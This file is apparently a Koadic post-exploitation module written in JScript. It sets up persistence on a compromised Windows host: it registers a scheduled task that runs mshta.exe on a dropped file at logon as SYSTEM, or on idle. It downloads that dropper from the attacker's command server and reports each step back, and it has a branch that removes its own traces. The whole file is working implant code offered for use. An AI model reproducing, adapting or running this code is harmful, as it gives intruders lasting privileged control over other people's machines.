try
{
    var headers = {};
    var taskname = "K0adic";
    var droppath = Koadic.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    if (~CLEANUP~)
    {
        var result = Koadic.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "DeleteTask";
        Koadic.work.report(result, headers);
        headers["Task"] = "DeleteDropper";
        Koadic.file.deleteFile(droppath);
        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        var result = Koadic.shell.exec("schtasks /query /tn "+taskname, "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "QueryTask";
        Koadic.work.report(result, headers);
        if (~NOFORCE~)
        {
            if (result.indexOf("ERROR") == -1)
            {
                result = Koadic.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
                headers["Task"] = "NoForceTask";
                Koadic.work.report("", headers);
            }
        }
        if (~ELEVATED~)
        {
            result = Koadic.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onlogon /ru System /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        }
        else
        {
            result = Koadic.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onidle /i 1 /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        }
        headers["Task"] = "AddTask";
        Koadic.work.report(result, headers);

        headers["X-UploadFileJob"] = "true";
        Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}
Koadic.exit();
